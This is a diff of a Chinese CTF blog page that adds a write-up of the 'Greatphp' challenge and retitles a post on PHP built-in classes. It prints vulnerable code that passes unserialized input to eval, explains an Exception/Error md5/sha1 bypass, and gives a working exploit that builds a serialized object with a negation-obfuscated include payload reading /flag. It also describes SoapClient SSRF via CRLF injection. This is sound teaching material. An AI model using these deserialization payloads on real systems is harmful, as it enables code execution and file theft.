@@ -112,13 +112,13 @@ var _hmt = _hmt || [];
 
   
     
-    <h3 class="article-title"><a href="/2025/02/03/bestPHP/"><span>bestPHP</span></a></h3>
+    <h3 class="article-title"><a href="/2025/02/03/PHP内置类相关/"><span>PHP内置类相关</span></a></h3>
     
   
 
   <div class="article-top-meta">
     <span class="posted-on">
-      <a href="/2025/02/03/bestPHP/" rel="bookmark">
+      <a href="/2025/02/03/PHP内置类相关/" rel="bookmark">
         <time class="entry-date published" datetime="2025-02-03T05:00:51.000Z">
           2025-02-03
         </time>
@@ -134,7 +134,7 @@ var _hmt = _hmt || [];
   <div class="article-content">
     <div class="entry">
       
-          <h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ol>
+          <h2 id="bestPHP-WP"><a href="#bestPHP-WP" class="headerlink" title="bestPHP:WP"></a>bestPHP:WP</h2><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ol>
 <li>php内置类SoapClient</li>
 <li>CRLF Injection漏洞</li>
 <li>call_user_func</li>
@@ -201,7 +201,20 @@ http请求遇到两个\r\n即%0d%0a，会将前半部分当做头部解析，而
 <p>第二步：通过变量覆盖，调用SoapClient类，从而触发__call 方法传值f&#x3D;extract&amp;name&#x3D;SoapClient POST:b&#x3D;call_user_func. 这样 call_user_func($b,$a)就变成call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’)) ，即调用 SoapClient 类不存在的 welcome_to_the_lctf2018 方法，从而触发 __call 方法发起 soap 请求进行 SSRF。</p>
 <p>这里的,我们访问时他会解析上一步的session文件，这样的的session数组的第一个元素就是一个SOAP对象，这里我们对它进行访问XXXX2018方法，触发__call导致SSRF<br>在flag.php。会将flag赋值给$_SESSION[‘flag’]</p>
 <p>第三步：将PHPSESSID改为我们在SoapClient类里设置的123456即可得到flag</p>
+<h2 id="极客大挑战-2020-Greatphp-WP"><a href="#极客大挑战-2020-Greatphp-WP" class="headerlink" title="[极客大挑战 2020]Greatphp:WP"></a>[极客大挑战 2020]Greatphp:WP</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ol>
+<li>Error|Exception内置类</li>
+<li>反序列化基础</li>
+<li>取反绕过</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class SYCLOVER &#123;</span><br><span class="line">    public $syc;</span><br><span class="line">    public $lover;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;</span><br><span class="line">           if(!preg_match(&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;, $this-&gt;syc, $match))&#123;</span><br><span class="line">               eval($this-&gt;syc);</span><br><span class="line">           &#125; else &#123;</span><br><span class="line">               die(&quot;Try Hard !!&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;great&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;great&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
+<p sytle="font-size:13px">第一眼看到题目，简单的md5和sha1绕过，一般传个数组进去就绕过了，但是这里发现他还需要对值进行命令执行,这里如果把数组传入eval当中会报错，这里我们就使用Error和Exeption内置类来绕过</p>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new Exception(&quot;payload&quot;,1);</span><br><span class="line">$b = new Exception(&quot;payload&quot;,2);</span><br><span class="line">echo $a;</span><br><span class="line">echo &quot;\r\n\r\n&quot;;</span><br><span class="line">echo $b;</span><br></pre></td></tr></table></figure>
+<p><img src="/../img/bestphp/2.png" alt="web2"><br>当ehco一个Exception类时会触发他的__toString方法，我们可以看到他除了报错行数之外都是相同的，那么久意味着我们若把两者放在同一行他们__toString方法的结果就是相同的，md5和sha1的结果也是相同的，并且他内部有一个code值，让他在比较时是不同的这里我们就可以绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )</span><br></pre></td></tr></table></figure>
+<p>然后是命令执行，测试发现当一个Exception类传到eval当中的时候他获取的值是他的message,并且message我们可控，那么题目就可以命令执行</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class SYCLOVER &#123;</span><br><span class="line">    public $syc;</span><br><span class="line">    public $lover;</span><br><span class="line"></span><br><span class="line">    public function __construct($b,$c)&#123;</span><br><span class="line">        $this-&gt;syc = $b;</span><br><span class="line">        $this-&gt;lover = $c;</span><br><span class="line">    &#125;</span><br><span class="line">$in = ~(&quot;/flag&quot;);</span><br><span class="line">$payload = &quot;?&gt;&lt;?=include~&quot;.$in.&quot;?&gt;&quot;;</span><br><span class="line">$b = new error($payload,1);$c=new error($payload,2);</span><br><span class="line">$a = new SYCLOVER($b,$c);</span><br><span class="line">echo(urlencode(serialize($a)));</span><br><span class="line">?&gt;</span><br><span class="line">因为过滤了引号所以需要取反绕过一下</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -220,7 +233,7 @@ http请求遇到两个\r\n即%0d%0a，会将前半部分当做头部解析，而
   </div>
   
     
-    <h3 class="article-read"><a href="/2025/02/03/bestPHP/"><span>more</span></a></h3>
+    <h3 class="article-read"><a href="/2025/02/03/PHP内置类相关/"><span>more</span></a></h3>
     
   
 </article>
